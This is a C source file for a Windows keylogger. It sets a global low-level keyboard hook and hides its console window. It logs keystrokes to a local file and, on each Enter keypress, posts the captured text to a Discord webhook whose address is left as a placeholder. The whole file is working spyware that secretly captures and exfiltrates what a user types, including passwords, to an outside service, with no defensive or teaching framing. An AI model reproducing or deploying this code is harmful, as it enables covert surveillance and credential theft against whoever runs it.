#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <strsafe.h>

#pragma comment(lib, "winhttp.lib")


#define WH_KEYBOARD_LL 13
HHOOK hHook = NULL;
HANDLE fileHandle;

void SendData();

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {   
        KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;
        if (pKeyInfo->vkCode == VK_BACK) { // backspace
            SetFilePointer(fileHandle, -1, NULL, FILE_END);
            SetEndOfFile(fileHandle);
        }
        else if (pKeyInfo->vkCode == VK_RETURN) { // enter
            SendData();
        }
        char ch = MapVirtualKey(pKeyInfo->vkCode, MAPVK_VK_TO_CHAR);
        DWORD written;
        WriteFile(fileHandle, &ch, 1, &written, NULL);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SendData() {

    char buffer[1024] = { 0 }; // incorrect buffer size ( supposed to be dynamic )
    DWORD bytesRead;
    SetFilePointer(fileHandle, 0, NULL, FILE_BEGIN); 
    ReadFile(fileHandle, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
    buffer[bytesRead] = '\0';
    SetFilePointer(fileHandle, 0, NULL, FILE_BEGIN);
    SetEndOfFile(fileHandle); // Clear the file after reading
    
    char postData[2048]; // incorrect buffer size ( supposed to be dynamic, but less than 2000 chars bc discord )
    StringCchCopyA(postData, _countof(postData), "content=");
    StringCchCatA(postData, _countof(postData), buffer);

    printf("\nSending data: %s", postData);
    
    HINTERNET hSession,
        hConnect,
        hReq;

    hSession = WinHttpOpen(
        L"Anon",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
        
    );
  
    hConnect = WinHttpConnect(hSession, L"discord.com",
            INTERNET_DEFAULT_HTTPS_PORT, 0);

    hReq = WinHttpOpenRequest(hConnect, L"POST", L"WEBHOOK_URL", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    WCHAR* Headers = L"Content-type: application/x-www-form-urlencoded";

    BOOL ReqResult = WinHttpSendRequest(hReq, Headers, -1, postData, strlen(postData), strlen(postData), 0);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
}

int main() {
    fileHandle = CreateFileW(L"test.txt", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    CloseHandle(fileHandle);


    return 0;
}
